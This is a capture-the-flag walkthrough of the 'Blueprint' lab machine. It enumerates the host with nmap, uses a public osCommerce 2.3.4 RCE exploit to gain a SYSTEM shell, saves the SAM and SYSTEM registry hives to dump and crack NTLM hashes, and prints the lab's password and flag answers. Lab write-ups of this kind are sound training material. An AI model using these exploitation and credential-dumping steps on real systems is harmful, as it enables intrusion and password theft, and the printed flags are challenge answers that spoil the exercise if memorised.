# Blueprint

Laurent Chauvin | April 09, 2024

## Resources

[1] https://hashes.com/en/decrypt/hash
[2] https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/7c705718-f58e-4886-8057-37c8fd9aede1
[3] https://www.deploymentresearch.com/fix-for-accessing-administrative-shares-when-deploying-windows-server-2012-r2-using-mdt/

## Progress

```
export IP=10.10.221.162
```

Nmap scan:

```bash
nmap -sC -sV -oN nmap/initial 10.10.221.162

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-09 23:47 EDT
Nmap scan report for 10.10.221.162
Host is up (0.21s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_http-title: Bad request!
| http-methods: 
|_  Potentially risky methods: TRACE
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: -1s
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:ac:aa:8e:75:17 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-10T03:48:49
|_  start_date: 2024-04-10T03:43:47
| smb-os-discovery: 
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-10T04:48:51+01:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.60 seconds
```

Lots of things !!! 

First, let's check the Apache server at http://10.10.221.162:8080/.

We find the directory `[DIR]	oscommerce-2.3.4/`.

Might be interesting to look for vuln:

```bash
searchsploit oscommerce 2.3.4     

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
osCommerce 2.3.4 - Multiple Vulnerabilities                                                                                                                                                               | php/webapps/34582.txt
osCommerce 2.3.4.1 - 'currency' SQL Injection                                                                                                                                                             | php/webapps/46328.txt
osCommerce 2.3.4.1 - 'products_id' SQL Injection                                                                                                                                                          | php/webapps/46329.txt
osCommerce 2.3.4.1 - 'reviews_id' SQL Injection                                                                                                                                                           | php/webapps/46330.txt
osCommerce 2.3.4.1 - 'title' Persistent Cross-Site Scripting                                                                                                                                              | php/webapps/49103.txt
osCommerce 2.3.4.1 - Arbitrary File Upload                                                                                                                                                                | php/webapps/43191.py
osCommerce 2.3.4.1 - Remote Code Execution                                                                                                                                                                | php/webapps/44374.py
osCommerce 2.3.4.1 - Remote Code Execution (2)                                                                                                                                                            | php/webapps/50128.py
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

Interesting !! Some SQLi and RCE.

Looking at the exploit, we can read 

```py
# Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
```

Let's check if the install directory exists in http://10.10.221.162:8080/oscommerce-2.3.4/catalog/install/.

Indeed it exists. How does the exploit works:

```py
# Exploit: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
```

Let's try:

```bash
python3 50128.py http://10.10.221.162:8080/oscommerce-2.3.4/catalog/

[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ 
```

Sweet !!!

By looking around, we can find a user named 'Lab' with this on his desktop:

```bash
RCE_SHELL$ dir C:\Users\Lab\Desktop\Toolbox

 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Lab\Desktop\Toolbox

11/27/2019  07:13 PM    <DIR>          .
11/27/2019  07:13 PM    <DIR>          ..
12/28/2016  12:19 AM               231 enable_uac.bat
               1 File(s)            231 bytes
               2 Dir(s)  19,505,995,776 bytes free
```

The challenge first ask for the NTLM hash decrypted of 'Lab' user. Let's dump it in a place we can retrieve it:

```bash
RCE_SHELL$ reg.exe save hklm\sam C:\xampp\htdocs\sam.save     
The operation completed successfully.
```

Now we can access the file from http://10.10.221.162:8080/

Let's do the same for system and security:


```bash
RCE_SHELL$ reg.exe save hklm\system C:\xampp\htdocs\system.save
The operation completed successfully.

RCE_SHELL$ reg.exe save hklm\security C:\xampp\htdocs\security.save
The operation completed successfully.
```

Now let's use `samdump2` to get the hashes:

```bash
samdump2 system.save sam.save

Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

Giving the hash `30e87bf999828446a1c1209ddde4c450` of Lab user to [1] yields:

`30e87bf999828446a1c1209ddde4c450:googleplus`

Let's have a look at the `enable_uac.bat` we saw previously:

```bash
RCE_SHELL$ type C:\Users\Lab\Desktop\Toolbox\enable_uac.bat

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v "FilterAdministratorToken" /t REG_DWORD /d 0x00000001 
cls 
ECHO "Your Windows 7 client will reboot in 15 seconds." 
timeout 15 
shutdown -t 0 -r
```

Some documentation about `FilterAdministratorToken` can be found here [2,3]

When looking for the root flag, I looked at:

```bash
RCE_SHELL$ dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\Users\Administrator\Desktop

11/27/2019  07:15 PM    <DIR>          .
11/27/2019  07:15 PM    <DIR>          ..
11/27/2019  07:15 PM                37 root.txt.txt
               1 File(s)             37 bytes
               2 Dir(s)  19,496,292,352 bytes free
```

and try, just to see what was going to happen:

```bash
RCE_SHELL$ type C:\Users\Administrator\Desktop\root.txt.txt
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```

I was expecting an error message, but no !!

## Flag

1. User

```
googleplus
```

2. Privesc

```
THM{aea1e3ce6fe7f89e10cea833ae009bee}
```
